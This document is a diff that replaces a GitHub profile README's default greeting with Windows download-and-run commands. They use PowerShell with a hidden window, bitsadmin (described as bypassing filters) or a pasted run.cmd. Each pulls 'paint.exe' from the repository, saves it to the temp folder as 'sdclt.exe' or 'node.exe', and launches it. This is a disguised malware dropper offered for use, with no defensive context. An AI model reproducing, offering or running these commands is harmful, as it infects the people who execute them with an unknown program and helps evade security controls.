@@ -1,16 +1,41 @@
-## Hi there 👋
+```url
+https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe
+```
 
-<!--
-**t3a0/t3a0** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+CMD one-liner:
 
-Here are some ideas to get you started:
+```cmd
+powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile $env:TEMP\sdclt.exe; start $env:TEMP\sdclt.exe"
+```
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+(or)
+
+```cmd
+powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile $env:TEMP\node.exe; start $env:TEMP\node.exe"
+```
+
+Alternative using bitsadmin (bypasses some filters):
+
+```cmd
+bitsadmin /transfer job /download /priority high https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe "%TEMP%\sdclt.exe" && start "%TEMP%\sdclt.exe"
+```
+
+(or)
+
+```cmd
+bitsadmin /transfer job /download /priority high https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe "%TEMP%\node.exe" && start "%TEMP%\node.exe"
+```
+
+Or copy-paste this into Notepad, save as run.cmd, double-click:
+
+```cmd
+@echo off
+powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile %TEMP%\sdclt.exe; start %TEMP%\sdclt.exe"
+```
+
+(or)
+
+```cmd
+@echo off
+powershell -w h -c "iwr -Uri 'https://github.com/t3a0/t3a0/raw/refs/heads/main/paint.exe' -OutFile %TEMP%\node.exe; start %TEMP%\node.exe"
+```
